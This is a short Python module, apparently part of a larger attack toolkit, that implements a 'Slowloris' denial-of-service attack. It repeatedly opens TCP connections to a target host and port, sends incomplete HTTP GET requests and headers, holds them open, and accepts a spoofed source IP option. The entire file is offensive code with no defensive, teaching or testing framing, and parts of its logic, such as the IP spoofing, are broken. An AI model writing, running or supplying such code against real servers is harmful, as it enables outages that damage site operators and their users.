import socket
import time
from app.logger import log_attack

def attack(target_ip, target_port, duration, intensity, packet_size=None, headers=None, spoof_ip=None):
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(intensity):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if spoof_ip:
                sock.bind((spoof_ip, 0))
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\n")

            if headers:
                for key, value in headers.items():
                    sock.send(f"{key}: {value}\r\n".encode())

            time.sleep(10)
            sock.close()

    log_attack("Slowloris", target_ip, target_port, duration, intensity)

    